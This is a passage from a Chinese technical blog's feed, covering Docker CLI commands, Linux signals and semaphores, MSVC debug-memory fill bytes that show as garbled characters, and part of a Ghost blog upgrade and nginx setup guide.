class="line"></span><br><span class="line">Options:</span><br><span class="line">-u :登陆的用户名</span><br><span class="line">-p :登陆的密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker login -u root -p root</span><br><span class="line">docker <span class="built_in">logout</span></span><br></pre></td></tr></table></figure><h3 id="3-4-2、pull-命令"><a href="#3-4-2、pull-命令" class="headerlink" title="3.4.2、pull 命令"></a>3.4.2、pull 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull [OPTIONS] NAME[:TAG|@DIGEST]: 从镜像仓库中拉取或者更新指定镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-a :拉取所有 tagged 镜像</span><br><span class="line">--disable-content-trust :忽略镜像的校验,默认开启</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker pull java</span><br><span class="line">docker pull -a java</span><br></pre></td></tr></table></figure><h3 id="3-4-3、push-命令"><a href="#3-4-3、push-命令" class="headerlink" title="3.4.3、push 命令"></a>3.4.3、push 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push [OPTIONS] NAME[:TAG]: 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">--disable-content-trust :忽略镜像的校验,默认开启</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker push myapache:v1</span><br></pre></td></tr></table></figure><h3 id="3-4-4、search-命令"><a href="#3-4-4、search-命令" class="headerlink" title="3.4.4、search 命令"></a>3.4.4、search 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search [OPTIONS] TERM: 从Docker Hub查找镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">--automated :只列出 automated build类型的镜像;</span><br><span class="line">--no-trunc :显示完整的镜像描述;</span><br><span class="line">-s :列出收藏数不小于指定值的镜像;</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker search -s 10 java</span><br></pre></td></tr></table></figure><h2 id="3-5、本地镜像管理"><a href="#3-5、本地镜像管理" class="headerlink" title="3.5、本地镜像管理"></a>3.5、本地镜像管理</h2><h3 id="3-5-1、images-命令"><a href="#3-5-1、images-命令" class="headerlink" title="3.5.1、images 命令"></a>3.5.1、images 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY[:TAG]]: 列出本地镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</span><br><span class="line">--digests :显示镜像的摘要信息；</span><br><span class="line">-f :显示满足条件的镜像；</span><br><span class="line">--format :指定返回值的模板文件；</span><br><span class="line">--no-trunc :显示完整的镜像信息；</span><br><span class="line">-q :只显示镜像ID；</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker images</span><br><span class="line">docker images ubuntu</span><br></pre></td></tr></table></figure><h3 id="3-5-2、rmi-命令"><a href="#3-5-2、rmi-命令" class="headerlink" title="3.5.2、rmi 命令"></a>3.5.2、rmi 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi [OPTIONS] IMAGE [IMAGE...]: 删除本地一个或多少镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f :强制删除；</span><br><span class="line">--no-prune :不移除该镜像的过程镜像，默认移除；</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker rmi -f runoob/ubuntu:v4</span><br></pre></td></tr></table></figure><h3 id="3-5-3、tag-命令"><a href="#3-5-3、tag-命令" class="headerlink" title="3.5.3、tag 命令"></a>3.5.3、tag 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] : 标记本地镜像，将其归入某一仓库</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker tag ubuntu:15.10 runoob/ubuntu:v3</span><br><span class="line">docker images   runoob/ubuntu:v3</span><br></pre></td></tr></table></figure><h3 id="3-5-4、build-命令"><a href="#3-5-4、build-命令" class="headerlink" title="3.5.4、build 命令"></a>3.5.4、build 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | - 命令用于使用 Dockerfile 创建镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">--build-arg=[] :设置镜像创建时的变量；</span><br><span class="line">--cpu-shares :设置 cpu 使用权重；</span><br><span class="line">--cpu-period :限制 CPU CFS周期；</span><br><span class="line">--cpu-quota :限制 CPU CFS配额；</span><br><span class="line">--cpuset-cpus :指定使用的CPU <span class="built_in">id</span>；</span><br><span class="line">--cpuset-mems :指定使用的内存 <span class="built_in">id</span>；</span><br><span class="line">--disable-content-trust :忽略校验，默认开启；</span><br><span class="line">-f :指定要使用的Dockerfile路径；</span><br><span class="line">--force-rm :设置镜像过程中删除中间容器；</span><br><span class="line">--isolation :使用容器隔离技术；</span><br><span class="line">--label=[] :设置镜像使用的元数据；</span><br><span class="line">-m :设置内存最大值；</span><br><span class="line">--memory-swap :设置Swap的最大值为内存+swap，<span class="string">&quot;-1&quot;</span>表示不限swap；</span><br><span class="line">--no-cache :创建镜像的过程不使用缓存；</span><br><span class="line">--pull :尝试去更新镜像的新版本；</span><br><span class="line">--quiet, -q :安静模式，成功后只输出镜像 ID；</span><br><span class="line">--<span class="built_in">rm</span> :设置镜像成功后删除中间容器；</span><br><span class="line">--shm-size :设置/dev/shm的大小，默认值是64M；</span><br><span class="line">--<span class="built_in">ulimit</span> :Ulimit配置。</span><br><span class="line">--tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。</span><br><span class="line">--network: 默认 default。在构建期间设置RUN指令的网络模式</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker build -t runoob/ubuntu:v1 .</span><br><span class="line">docker build github.com/creack/docker-firefox</span><br><span class="line">docker build -f /path/to/a/Dockerfile .</span><br><span class="line">docker build -t <span class="built_in">test</span>/myapp .</span><br></pre></td></tr></table></figure><h3 id="3-5-5、history-命令"><a href="#3-5-5、history-命令" class="headerlink" title="3.5.5、history 命令"></a>3.5.5、history 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">history</span> [OPTIONS] IMAGE : 查看指定镜像的创建历史</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-H :以可读的格式打印镜像大小和日期，默认为<span class="literal">true</span>；</span><br><span class="line">--no-trunc :显示完整的提交记录；</span><br><span class="line">-q :仅列出提交记录ID;</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker <span class="built_in">history</span> runoob/ubuntu:v3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-5-6、save-命令"><a href="#3-5-6、save-命令" class="headerlink" title="3.5.6、save 命令"></a>3.5.6、save 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save [OPTIONS] IMAGE [IMAGE...]: 将指定镜像保存成 tar 归档文件</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-o :输出到的文件</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3</span><br></pre></td></tr></table></figure><h3 id="3-5-7、import-命令"><a href="#3-5-7、import-命令" class="headerlink" title="3.5.7、import 命令"></a>3.5.7、import 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]： 从归档文件中创建镜像</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-c :应用docker 指令创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker import my_ubuntu_v3.tar runoob/ubuntu:v4</span><br><span class="line">docker images runoob/ubuntu:v4</span><br></pre></td></tr></table></figure><h2 id="3-6、info-version"><a href="#3-6、info-version" class="headerlink" title="3.6、info|version"></a>3.6、info|version</h2><h3 id="3-6-1、info-命令"><a href="#3-6-1、info-命令" class="headerlink" title="3.6.1、info 命令"></a>3.6.1、info 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info [OPTIONS]: 显示 Docker 系统信息，包括镜像和容器数</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h3 id="3-6-2、version-命令"><a href="#3-6-2、version-命令" class="headerlink" title="3.6.2、version 命令"></a>3.6.2、version 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version [OPTIONS]:显示 Docker 版本信息</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-f :指定返回值的模板文件</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Docker </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux的信号与信号量机制</title>
      <link href="/2017/07/12/singnal-semaphore/"/>
      <url>/2017/07/12/singnal-semaphore/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信号-Signal-机制"><a href="#一、信号-Signal-机制" class="headerlink" title="一、信号(Signal)机制"></a>一、信号(Signal)机制</h2><p>Signal，又简称为信号（软中断信号）用来通知进程发生了异步事件，<strong>是一种处理异步事件的方式</strong>。一个进程不必通过任何操作来等待信号的到达，事实上，进程也不知道信号到底什么时候到达。进程之间可以互相通过系统调用kill发送软中断信号。内核也可以因为内部事件而给进程发送信号，通知进程发生了某个事件。信号机制除了基本通知功能外，还可以传递附加信息。</p><p>按照不同的分类角度（可靠性方面，与时间的关系上）可以对信号进行区分：</p><ul><li><strong>可靠信号（实时信号）</strong>：支持排队, 信号不会丢失，发多少次进程就可会收到多少次，信号值取值区间为<code>34</code>~&#96;64&#96;；</li><li><strong>不可靠信号（非实时信号）</strong>：不支持排队，信号可能会丢失，比如发送多次相同的信号，进程只能收到一次，信号值取值区间为<code>1</code>~&#96;31&#96;；</li></ul><h3 id="2-1、信号表"><a href="#2-1、信号表" class="headerlink" title="2.1、信号表"></a>2.1、信号表</h3><h4 id="2-1-1、不可靠信号（非实时信号）表"><a href="#2-1-1、不可靠信号（非实时信号）表" class="headerlink" title="2.1.1、不可靠信号（非实时信号）表"></a>2.1.1、不可靠信号（非实时信号）表</h4><table><thead><tr><th align="center">取值</th><th align="center">名称</th><th align="center">解释</th><th align="center">取值</th><th align="center">名称</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">SIGHUP</td><td align="center">挂起</td><td align="center">2</td><td align="center">SIGINT</td><td align="center">中断</td></tr><tr><td align="center">3</td><td align="center">SIGQUIT</td><td align="center">退出</td><td align="center">4</td><td align="center">SIGILL</td><td align="center">非法指令</td></tr><tr><td align="center">5</td><td align="center">SIGTRAP</td><td align="center">断点或陷阱指令</td><td align="center">6</td><td align="center">SIGABRT</td><td align="center">abort发出的信号</td></tr><tr><td align="center">7</td><td align="center">SIGBUS</td><td align="center">非法内存访问</td><td align="center">8</td><td align="center">SIGFPE</td><td align="center">浮点异常</td></tr><tr><td align="center">9</td><td align="center">SIGKILL</td><td align="center">kill信号</td><td align="center">10</td><td align="center">SIGUSR1</td><td align="center">用户信号1</td></tr><tr><td align="center">11</td><td align="center">SIGSEGV</td><td align="center">无效内存访问</td><td align="center">12</td><td align="center">SIGUSR2</td><td align="center">用户信号2</td></tr><tr><td align="center">13</td><td align="center">SIGPIPE</td><td align="center">管道破损，没有读端的管道写数据</td><td align="center">14</td><td align="center">SIGALRM</td><td align="center">alarm发出的信号</td></tr><tr><td align="center">15</td><td align="center">SIGTERM</td><td align="center">终止信号</td><td align="center">16</td><td align="center">SIGSTKFLT</td><td align="center">栈溢出</td></tr><tr><td align="center">17</td><td align="center">SIGCHLD</td><td align="center">子进程退出</td><td align="center">18</td><td align="center">SIGCONT</td><td align="center">进程继续</td></tr><tr><td align="center">19</td><td align="center">SIGSTOP</td><td align="center">进程停止</td><td align="center">20</td><td align="center">SIGTSTP</td><td align="center">进程停止</td></tr><tr><td align="center">21</td><td align="center">SIGTTIN</td><td align="center">进程停止，后台进程从终端读数据时</td><td align="center">22</td><td align="center">SIGTTOU</td><td align="center">进程停止，后台进程向终端写数据时</td></tr><tr><td align="center">23</td><td align="center">SIGURG</td><td align="center">I&#x2F;O有紧急数据到达当前进程</td><td align="center">24</td><td align="center">SIGXCPU</td><td align="center">进程的CPU时间片到期</td></tr><tr><td align="center">25</td><td align="center">SIGXFSZ</td><td align="center">文件大小的超出上限</td><td align="center">26</td><td align="center">SIGVTALRM</td><td align="center">虚拟时钟超时</td></tr><tr><td align="center">27</td><td align="center">SIGPROF</td><td align="center">profile时钟超时</td><td align="center">28</td><td align="center">SIGWINCH</td><td align="center">窗口大小改变</td></tr><tr><td align="center">29</td><td align="center">SIGIO</td><td align="center">I&#x2F;O相关</td><td align="center">30</td><td align="center">SIGPWR</td><td align="center">关机</td></tr><tr><td align="center">31</td><td align="center">SIGSYS</td><td align="center">系统调用异常</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h4 id="2-1-2、可靠信号（实时信号）表"><a href="#2-1-2、可靠信号（实时信号）表" class="headerlink" title="2.1.2、可靠信号（实时信号）表"></a>2.1.2、可靠信号（实时信号）表</h4><table><thead><tr><th align="center">取值</th><th align="center">名称</th><th align="center">取值</th><th align="center">名称</th><th align="center">取值</th><th align="center">名称</th></tr></thead><tbody><tr><td align="center">34</td><td align="center">SIGRTMIN</td><td align="center">35</td><td align="center">SIGRTMIN+1</td><td align="center">36</td><td align="center">SIGRTMIN+2</td></tr><tr><td align="center">37</td><td align="center">SIGRTMIN+3</td><td align="center">38</td><td align="center">SIGRTMIN+4</td><td align="center">39</td><td align="center">SIGRTMIN+5</td></tr><tr><td align="center">40</td><td align="center">SIGRTMIN+6</td><td align="center">41</td><td align="center">SIGRTMIN+7</td><td align="center">42</td><td align="center">SIGRTMIN+8</td></tr><tr><td align="center">43</td><td align="center">SIGRTMIN+9</td><td align="center">44</td><td align="center">SIGRTMIN+10</td><td align="center">45</td><td align="center">SIGRTMIN+11</td></tr><tr><td align="center">46</td><td align="center">SIGRTMIN+12</td><td align="center">47</td><td align="center">SIGRTMIN+13</td><td align="center">48</td><td align="center">SIGRTMIN+14</td></tr><tr><td align="center">49</td><td align="center">SIGRTMIN+15</td><td align="center">50</td><td align="center">SIGRTMAX-14</td><td align="center">51</td><td align="center">SIGRTMAX-13</td></tr><tr><td align="center">52</td><td align="center">SIGRTMAX-12</td><td align="center">53</td><td align="center">SIGRTMAX-11</td><td align="center">54</td><td align="center">SIGRTMAX-10</td></tr><tr><td align="center">55</td><td align="center">SIGRTMAX-9</td><td align="center">56</td><td align="center">SIGRTMAX-8</td><td align="center">57</td><td align="center">SIGRTMAX-7</td></tr><tr><td align="center">58</td><td align="center">SIGRTMAX-6</td><td align="center">59</td><td align="center">SIGRTMAX-5</td><td align="center">60</td><td align="center">SIGRTMAX-4</td></tr><tr><td align="center">61</td><td align="center">SIGRTMAX-3</td><td align="center">62</td><td align="center">SIGRTMAX-2</td><td align="center">63</td><td align="center">SIGRTMAX-1</td></tr><tr><td align="center">64</td><td align="center">SIGRTMAX</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="2-2、信号触发"><a href="#2-2、信号触发" class="headerlink" title="2.2、信号触发"></a>2.2、信号触发</h3><ul><li><strong>硬件方式：</strong><ul><li>终端输入：例如， <code>Ctrl + C(SIGINT)</code>、<code>Ctrl + \(SIGQUIT)</code>、<code>Ctrl + Z(SIGTSTP)</code>；</li><li>硬件检测异常：由硬件检测到并通知内核并由内核向当前进程发送适当的信号。例如除 0 导致 CPU 产生异常，内核将该异常解释为 <code>SIGFPE</code> 信号发送给进程，访问非法内存地址导致 MMU 产生异常，内核将该异常解释为 <code>SIGSEGV</code> 信号发送给进程；</li></ul></li><li><strong>软件方式：</strong><ul><li>使用如下指令给进程发送信号：<code>kill()</code>，<code>raise()</code>，<code>sigqueue()</code>，<code>alarm()</code>，<code>abort()</code>等；</li></ul></li></ul><h3 id="2-3、信号处理"><a href="#2-3、信号处理" class="headerlink" title="2.3、信号处理"></a>2.3、信号处理</h3><ul><li><strong>默认</strong>：默认的处理方式；</li><li><strong>自定义</strong>：使用自定义的信号捕获函数捕获信号后进行处理；</li><li><strong>忽略</strong>：对指定信号不做处理；</li></ul><h2 id="二、信号量（Semaphore）机制"><a href="#二、信号量（Semaphore）机制" class="headerlink" title="二、信号量（Semaphore）机制"></a>二、信号量（Semaphore）机制</h2><p>信号量在创建时需要设置一个初始值，表示同时可以有几个任务可以访问该信号量保护的共享资源，初始值为<code>1</code>就变成互斥锁（Mutex），即同时只能有一个任务可以访问信号量保护的共享资源，<strong>是进程间通信处理同步互斥的机制</strong>。</p><p>一个任务要想访问共享资源，首先必须得到信号量，获取信号量的操作将把信号量的值<code>减1</code>，若当前信号量的值为<code>负数</code>，表明无法获得信号量，该任务必须挂起在该信号量的等待队列等待该信号量可用；若当前信号量的值为<code>非负数</code>，表示可以获得信号量，因而可以立刻访问被该信号量保护的共享资源。</p><p> 当任务访问完被信号量保护的共享资源后，必须释放信号量，释放信号量通过把信号量的值<code>加1</code>实现，如果信号量的值为<code>非正数</code>，表明有任务等待当前信号量，因此它也唤醒所有等待该信号量的任务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Signal </tag>
            
            <tag> Semaphore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言中有趣的烫烫烫</title>
      <link href="/2017/06/04/c-encoding-problem/"/>
      <url>/2017/06/04/c-encoding-problem/</url>
      
        <content type="html"><![CDATA[<h2 id="一、现象"><a href="#一、现象" class="headerlink" title="一、现象"></a>一、现象</h2><p>在学校使用Windows下的Visual Studio 2017进行课堂C的学习过程中遇到过很多类似于<code>烫烫烫烫烫烫</code>，<code>锟斤拷</code>，<code>屯屯屯</code>等比较有意思的乱码，也闹出了一些比较有意思的事情。</p><p>以下是部分乱码在不同的编码类型下的编码值：</p><table><thead><tr><th align="center">字符</th><th align="center">简体中文(GB2312)</th><th align="center">Unicode</th><th align="center">Unicode (UTF-8)</th></tr></thead><tbody><tr><td align="center">烫</td><td align="center">CCCC</td><td align="center">EB70</td><td align="center">E783AB</td></tr><tr><td align="center">锟</td><td align="center">EFBF</td><td align="center">1F95</td><td align="center">E9949F</td></tr><tr><td align="center">斤</td><td align="center">BDEF</td><td align="center">A465</td><td align="center">E696A4</td></tr><tr><td align="center">拷</td><td align="center">BFBD</td><td align="center">F762</td><td align="center">E68BB7</td></tr><tr><td align="center">屯</td><td align="center">CDCD</td><td align="center">6F5C</td><td align="center">E5B1AF</td></tr><tr><td align="center">锘</td><td align="center">EFBB</td><td align="center">1895</td><td align="center">E99498</td></tr><tr><td align="center">傻</td><td align="center">C9B5</td><td align="center">BB50</td><td align="center">E582BB</td></tr></tbody></table><h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h2><p>以上比较有意思的乱码情况仅出现在使用Visual Studio或者VC6.0自带的MSVC编译器进行编译时才会出现，也就是说通常只有在Windows环境下使用Visual Studio或者VC6.0进行代码开发，并且处于Debug的运行模式才会出现。</p><h3 id="2-1、烫（0xCCCC）"><a href="#2-1、烫（0xCCCC）" class="headerlink" title="2.1、烫（0xCCCC）"></a>2.1、烫（0xCCCC）</h3><p>MSVC编译器会将<strong>未被初始化的栈内存</strong>使用<code>0XCC</code>进行填充，导致我们在使用为初始化的栈内存时便会出现<code>烫烫烫</code>的错误提示；</p><p><img src="https://cdn.bugwz.com/0xcccc.png" alt="烫（0xCCCC）"></p><h3 id="2-2、屯（0xCDCD）"><a href="#2-2、屯（0xCDCD）" class="headerlink" title="2.2、屯（0xCDCD）"></a>2.2、屯（0xCDCD）</h3><p><strong>MSVC编译器会将</strong>未被初始化的堆内存使用<code>0XCD</code>进行填充，导致我们在使用为初始化的栈内存时便会出现<code>屯屯屯</code>的错误提示；</p><p><img src="https://cdn.bugwz.com/0xcdcd.png" alt="屯（0xCDCD）"></p><h3 id="2-3、锟斤拷"><a href="#2-3、锟斤拷" class="headerlink" title="2.3、锟斤拷"></a>2.3、锟斤拷</h3><p><strong>锟斤拷</strong>涉及<code>Unicode</code>字符集转换问题，在编码转化你的过程中，当Unicode无法表示一个字符的时候，它会用一个占位符（U+FFFD REPLACEMENT CHARACTER）来表示这些文字。U+FFFD的UTF-8编码是<code>0xEFBFBD</code>，如果重复多次形成<strong>锟斤拷</strong>的盛状。</p><p><img src="https://cdn.bugwz.com/0xefbfbdefbfbd.png" alt="锟斤拷"></p><h3 id="2-4、锘"><a href="#2-4、锘" class="headerlink" title="2.4、锘"></a>2.4、锘</h3><p>微软在 <code>UTF-8</code> 文件头部加上了 <code>EF BB BF BOM</code> 标志。在不支持 BOM 的环境下对其停止 UTF-8 解码失掉<strong>锘</strong>字，</p><p><code>BOM</code> 是 <code>Byte Order Mark</code> 的缩写。是UTF编码方案里用于标识编码的标准标记，在<code>UTF-16</code>里本来是<code>FF FE</code>，变成<code>UTF-8</code>就成了<code>EF BB BF</code>。这个标记是可选的，因为<code>UTF8</code>字节没有顺序，所以它可以被用来检测一个字节流是否是<code>UTF-8</code>编码的。</p><p><img src="https://cdn.bugwz.com/0xefbb.png" alt="锘"></p><p>参考地址：<a href="https://zhuanlan.zhihu.com/p/27253604">https://zhuanlan.zhihu.com/p/27253604</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ghost博客成功&quot;更新&quot;至0.11.9</title>
      <link href="/2017/05/27/ghost-0-11-9/"/>
      <url>/2017/05/27/ghost-0-11-9/</url>
      
        <content type="html"><![CDATA[<p>Ghost真的是一个让我又爱又恨的博客平台，界面的简洁之美，写作的流畅与舒适，还有那烦人的安装与更新操作。在差不多一年之前吧，我安装了版本是 <code>0.7.4</code> 的Ghost平台，那时候用的是<a href="http://www.ghostchina.com/" target="_blank">Ghost中文网</a>中的那个 <code>Ghost 中文集成版</code> ，当时也是费了很多周折，使用到现在也没有出现什么问题。也是在最近几天，闲着没事去Ghost中文网看了看，竟然还是 <code>0.7.4</code> 的版本！心想难道Ghost一直没更新？于是去英文官网看了看，才发现原来Ghost有两个路线，一个是 <code>Alpha</code> 版本，已经更新到了 <code>Alpha.21</code> ，一个是正式版，也已经更新到了 <code>0.11.9</code> ；而Ghost中文网的内容就有点滞后了，希望可以尽快更新。之后我就想体验新版本的Ghost。开始吧~</p><h2 id="一、尝试更新Ghost"><a href="#一、尝试更新Ghost" class="headerlink" title="一、尝试更新Ghost"></a>一、尝试更新Ghost</h2><p>根据Ghost英文官网的 <a href="https://support.ghost.org/how-to-upgrade" target="_blank">How-To-Upgrade</a>更新指导步骤，我整理如下：</p><ul><li>备份：在后台中的”实验室”栏目中导出一个 <code>.json文件</code> ，并且将Ghost根目录中的 <code>content目录</code> 进行备份(这里存放着博客站点的所有上传图片和主题)。而我直接是把 <code>整个Ghost目录和数据库</code> 进行了备份。记住：一定要备份！无论你做什么一定要备份！！！</li><li>检查Ghost平台是否可以重启：因为在更新Ghost完成之后，或者更新出错进行调试的时候，需要重启Ghost，所以我们必须确保Ghost可以重启；</li><li>关于跨版本更新的问题：源版本与目标版本如果跨度较大可能会出现问题，所以更新升级的建议如下：</li><li><code>0.7.1</code> 或更高版本应该可以直接升级到 <code>0.11.9</code> ；</li><li><code>0.5.0</code> 或更高版本应该可以直接升级到 <code>0.7.x</code> ；</li><li><code>0.4.2</code> 的版本必须升级到版本 <code>0.7.1</code>（<code>0.7.0</code>有几个升级错误，在<code>0.7.1</code>中被解决），然后升级到更高版本的<code>0.7.x</code>；</li><li><code>0.4.2</code>之前的版本必须按照版本号由低到高升级，直到达到<code>0.4.2</code>；</li><li>下载新版本并解压：可以使用 <code>wget</code> 或者 <code>curl -LOk</code> 下载<br> <code>https://ghost.org/zip/ghost-latest.zip</code> 中的最新版本文件，然后可以使用 <code>unzip Ghost-*.*.*.zip -d ghost-*.*.*</code> 解压。</li><li>删除旧文件&#x2F;复制新文件：删除Ghost更目录下的 <code>core目录</code> 、<code>index.js</code> 、<code>*.md</code> 和 <code>*.json</code> ；复制新版本Ghost目录中的<br> <code>core目录</code> 、 <code>index.js</code> 、 <code>package.json</code> 和 <code>npm-shrinkwrap.json</code> 到目前的Ghost根目录中。</li><li>开始升级：在目前的Ghost目录中执行升级命令 <code>npm install --production --unsafe-perm</code> ，如果期间报错，先删除 <code>node_modules文件夹</code> ，再运行 <code>npm cache clean</code> 并重试。最后运行 <code>npm start --production</code> 进行调试。</li></ul><blockquote><p> 使用 <code>npm install --production --unsafe-perm</code> 需要注意的问题：</p></blockquote><ul><li>添加 <code>--unsafe-perm</code> 的参数的原因是：如果我们不添加这个参数，会出现类似于 <code>npm WARN cannot run in wd test@0.0.0 echo something (wd=/Users/Lloyd/Documents/test)</code> 的错误，原因是如果使用root权限调用 <code>npm</code> ，那么它会将 <code>uid</code> 更改为用户配置指定的 <code>uid</code> ，默认为 <code>nobody</code> ，设置<code> --unsafe-perm</code> 参数以使用root权限运行脚本；</li><li>因为GFW的原因，使用 <code>npm install --production --unsafe-perm</code> 可能会出现很多错误，建议修改一下 <code>npm</code> 的镜像源，这里推荐<a href="http://npm.taobao.org/" target="_blank">淘宝 NPM 镜像</a>，具体使用命令为（其他修改方法见<a href="https://cnodejs.org/topic/4f9904f9407edba21468f31e" target="_blank">这里</a>）：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org </span><br><span class="line">npm info underscore（如果上面配置正确这个命令会有字符串response）</span><br></pre></td></tr></table></figure><ul><li>由于我这里不使用 <code>sqlite3</code> ，所以我吧 <code>package.json</code> 中的 <code>sqlite3</code> 依赖包给删除了，否则的话安装会卡住不动。</li></ul><h2 id="二、全新安装Ghost平台"><a href="#二、全新安装Ghost平台" class="headerlink" title="二、全新安装Ghost平台"></a>二、全新安装Ghost平台</h2><p>因为之前安装Ghost也出现了不少问题，但是目前都忘了，为了回顾一下，也为了照顾第一次使用Ghost的用户，这里再说明一下全新安装 <code>Ghost 0.11.9</code> 的方法。下文中部分参考于<a href="https://snowz.me/how-to-install-ghost/" target="_blank">手把手教你搭建一个属于自己的Ghost博客</a></p><h3 id="2-1-安装-Node-环境"><a href="#2-1-安装-Node-环境" class="headerlink" title="2.1 安装 Node 环境"></a>2.1 安装 <code>Node</code> 环境</h3><p>由于 <code>Ghost</code> 是基于 <code>Node</code> 的，所以 <code>Node</code> 的环境是必须第一步要安装的，而 <code>Ghost</code> 对于 <code>Node</code> 版本的要求也是十分苛刻的，具体要求可以去<a href="http://support.ghost.org/supported-node-versions/" target="_blank">官方的说明</a>中去查看，我整理如下：</p><ul><li>Ghost目前支持的Node版本只有 <code>0.12.x</code> 、 <code>4.2+</code> 、 <code>6.9+</code>；</li><li>官方推荐的版本是 <code>4.2+</code> ，经实测使用 <code>4.5</code> 会报错，所以这里的<br> <code>4.2+</code> 应该是指 <code>4.2.*</code> ；</li></ul><p>我在这里使用的 <code>Node</code> 版本是4.2.5，安装Node的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nodejs.org/dist/v4.2.5/node-v4.2.5.tar.gz</span><br><span class="line">tar zxvf node-v4.2.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> node-v4.2.5</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="2-2-安装Nginx并配置"><a href="#2-2-安装Nginx并配置" class="headerlink" title="2.2 安装Nginx并配置"></a>2.2 安装Nginx并配置</h3><p>首先我们安装Nginx：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure><p>安装之后可以使用IP访问，检查 <code>Nginx</code> 是否安装成功，然后我们需要为Ghost平台在 <code>/etc/nginx/conf.d</code> 目录下创建一个配置文件<br> <code>ghost.conf</code> ：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/nginx/conf.d/ghost.conf</span><br></pre></td></tr></table></figure><p>写入的内容如下所示：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#http访问</span></span><br><span class="line"><span class="section">server</span> &#123;  </span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com; <span class="comment">#将example.com改为你的域名或ip</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_set_header</span>   X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span>   Host      <span class="variable">$http_host</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span>         http://127.0.0.1:2368;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#https访问，可以配置也可以不配置：</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span>;</span><br><span class="line"><span class="attribute">server_name</span> example.com; <span class="comment">#将example.com改为你的域名或ip</span></span><br><span class="line"><span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line"><span 